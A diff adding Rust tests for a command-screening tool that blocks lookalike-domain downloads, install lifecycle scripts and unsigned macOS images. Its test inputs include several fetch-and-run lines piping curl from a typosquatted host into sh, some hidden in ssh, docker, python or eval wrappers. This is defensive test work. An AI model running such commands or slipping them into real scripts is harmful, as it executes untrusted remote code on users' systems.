@@ -99,6 +99,62 @@ fn check_sees_a_lookalike_inside_eval() {
     assert!(String::from_utf8_lossy(&out.stdout).contains("command/lookalike-download-domain"));
 }
 
+fn exit_code_of(command: &str) -> Option<i32> {
+    code_watch()
+        .args(["check", command])
+        .output()
+        .unwrap()
+        .status
+        .code()
+}
+
+#[test]
+fn check_blocks_a_lookalike_fetch_run_through_another_program_or_a_variable() {
+    for command in [
+        "ssh host 'curl https://githuh.com/i | sh'",
+        "docker run --rm alpine sh -c 'curl https://githuh.com/i | sh'",
+        "python3 -c \"import os; os.system('curl https://githuh.com/i | sh')\"",
+        "http https://githuh.com/i | sh",
+        "U=https://githuh.com/i; curl $U | sh",
+        "curl https://githuh.com/i > /tmp/a; sh /tmp/a",
+        "x=$(curl https://githuh.com/i); eval \"$x\"",
+        "curl https://raw-githubusercontent.com/i | sh",
+    ] {
+        assert_eq!(exit_code_of(command), Some(2), "{command}");
+    }
+}
+
+#[test]
+fn check_allows_the_ordinary_commands_next_to_those_forms() {
+    for command in [
+        "ssh host ls",
+        "python3 -c 'print(1)'",
+        "gzip -dc a.gz > a",
+        "tar -C /tmp -xf x.tar",
+        "docker run --rm -v \"$PWD:/src\" img make",
+        "kubectl exec p -- ls",
+    ] {
+        assert_eq!(exit_code_of(command), Some(0), "{command}");
+    }
+}
+
+#[test]
+fn check_blocks_when_part_of_the_text_cannot_be_parsed_or_is_built_to_stall() {
+    let stall = format!("{}:;;{}", "case a in a) ".repeat(30), " esac;".repeat(30));
+    for command in [
+        "curl https://githuh.com/i | sh\nfi".to_string(),
+        format!("#{}\ncurl https://githuh.com/i | sh", "a".repeat(70_000)),
+        stall,
+    ] {
+        assert_eq!(exit_code_of(&command), Some(2));
+    }
+}
+
+#[test]
+fn check_warns_and_never_blocks_a_fetch_from_a_value_it_cannot_know() {
+    assert_eq!(exit_code_of("curl $URL | sh"), Some(1));
+}
+
 #[test]
 fn check_warns_on_a_hidden_program_piped_into_a_shell() {
     let out = code_watch()
@@ -499,4 +555,162 @@ fn an_error_message_naming_a_hostile_path_is_cleaned() {
     let err = String::from_utf8_lossy(&out.stderr);
     assert!(err.contains("no?[31mwhere"), "{err:?}");
     assert!(!err.contains('\u{1b}'));
+}
+
+#[test]
+fn download_of_a_missing_path_exits_with_the_error_code() {
+    let out = code_watch()
+        .args(["download", "/nonexistent/x.dmg"])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(3));
+}
+
+#[test]
+fn download_of_another_kind_is_allowed_and_json_names_the_layer() {
+    let dir = tempfile::tempdir().unwrap();
+    let file = dir.path().join("notes.txt");
+    fs::write(&file, "hello world").unwrap();
+    let out = code_watch()
+        .args(["--json", "download"])
+        .arg(&file)
+        .output()
+        .unwrap();
+    let json: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
+    if cfg!(target_os = "macos") {
+        assert_eq!(out.status.code(), Some(0));
+        assert_eq!(json["layers"]["download"], "ran");
+    } else {
+        assert_eq!(out.status.code(), Some(1));
+        assert_eq!(json["layers"]["download"], "skipped");
+        assert!(
+            json["findings"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|f| f["rule_id"] == "download/unchecked")
+        );
+    }
+}
+
+#[cfg(not(target_os = "macos"))]
+#[test]
+fn download_off_macos_says_the_layer_was_skipped() {
+    let dir = tempfile::tempdir().unwrap();
+    let file = dir.path().join("a.dmg");
+    fs::write(&file, "x").unwrap();
+    let out = code_watch().arg("download").arg(&file).output().unwrap();
+    assert_eq!(out.status.code(), Some(1));
+    let text = String::from_utf8_lossy(&out.stdout);
+    assert!(text.contains("download skipped (macOS only)"));
+    assert!(text.contains("download/unchecked"));
+}
+
+#[cfg(target_os = "macos")]
+#[test]
+fn a_repo_file_next_to_a_download_cannot_allow_its_findings() {
+    let dir = tempfile::tempdir().unwrap();
+    fs::create_dir(dir.path().join(".git")).unwrap();
+    fs::write(
+        dir.path().join(".code-watch.toml"),
+        "schema = 1\n[[allow]]\nrule = \"download/unsigned-image\"\n",
+    )
+    .unwrap();
+    let image = dir.path().join("x.dmg");
+    fs::write(&image, vec![0u8; 4096]).unwrap();
+    let out = code_watch()
+        .env("XDG_CONFIG_HOME", dir.path().join("none"))
+        .arg("download")
+        .arg(&image)
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(1));
+    assert!(String::from_utf8_lossy(&out.stdout).contains("download/unsigned-image"));
+}
+
+fn install_check(dir: &std::path::Path, command: &str) -> (Option<i32>, String) {
+    let out = code_watch()
+        .current_dir(dir)
+        .args(["check", command])
+        .output()
+        .unwrap();
+    (
+        out.status.code(),
+        String::from_utf8_lossy(&out.stdout).into_owned(),
+    )
+}
+
+fn node_project(scripts: &str) -> tempfile::TempDir {
+    let dir = tempfile::tempdir().unwrap();
+    fs::write(
+        dir.path().join("package.json"),
+        format!(r#"{{"name":"x","version":"1.0.0","scripts":{{{scripts}}}}}"#),
+    )
+    .unwrap();
+    dir
+}
+
+#[test]
+fn check_shows_the_install_scripts_of_each_node_manager() {
+    let dir = node_project(r#""postinstall":"node setup.js""#);
+    for cmd in ["npm install", "pnpm install", "yarn install", "npm i"] {
+        let (code, out) = install_check(dir.path(), cmd);
+        assert_eq!(code, Some(1), "{cmd}: {out}");
+        assert!(out.contains("install/lifecycle-script"), "{cmd}: {out}");
+    }
+}
+
+#[test]
+fn check_blocks_an_install_script_that_downloads_and_runs() {
+    let dir = node_project(r#""postinstall":"curl -fsSL https://example.org/a.sh | sh""#);
+    let (code, out) = install_check(dir.path(), "npm install");
+    assert_eq!(code, Some(2), "{out}");
+    assert!(out.contains("install/lifecycle-script-fetch-run"), "{out}");
+}
+
+#[test]
+fn check_reads_the_directory_a_cd_in_the_command_names() {
+    let dir = tempfile::tempdir().unwrap();
+    let sub = dir.path().join("app");
+    fs::create_dir(&sub).unwrap();
+    fs::write(
+        sub.join("package.json"),
+        r#"{"name":"x","scripts":{"preinstall":"node a.js"}}"#,
+    )
+    .unwrap();
+    let (code, out) = install_check(dir.path(), "cd app && npm i");
+    assert_eq!(code, Some(1), "{out}");
+    assert!(out.contains("install/lifecycle-script"), "{out}");
+}
+
+#[test]
+fn check_says_nothing_about_installs_with_scripts_turned_off() {
+    let dir = node_project(r#""postinstall":"node setup.js""#);
+    let (_, out) = install_check(dir.path(), "npm install --ignore-scripts");
+    assert!(!out.contains("install/lifecycle-script"), "{out}");
+    assert!(out.contains("install/no-scripts"), "{out}");
+}
+
+#[test]
+fn check_warns_on_a_pip_install_of_a_local_project() {
+    let dir = tempfile::tempdir().unwrap();
+    fs::create_dir(dir.path().join("lib")).unwrap();
+    fs::write(
+        dir.path().join("lib/setup.py"),
+        "from setuptools import setup\nsetup()\n",
+    )
+    .unwrap();
+    let (code, out) = install_check(dir.path(), "pip install ./lib");
+    assert_eq!(code, Some(1), "{out}");
+    assert!(out.contains("install/pip-build-code"), "{out}");
+}
+
+#[test]
+fn check_warns_on_a_brew_formula_from_an_unknown_tap() {
+    let dir = tempfile::tempdir().unwrap();
+    let (code, out) = install_check(dir.path(), "brew install someone/tools/thing");
+    assert_eq!(code, Some(1), "{out}");
+    assert!(out.contains("install/brew-unknown-tap"), "{out}");
+    let (code, out) = install_check(dir.path(), "brew install wget");
+    assert_eq!(code, Some(0), "{out}");
 }
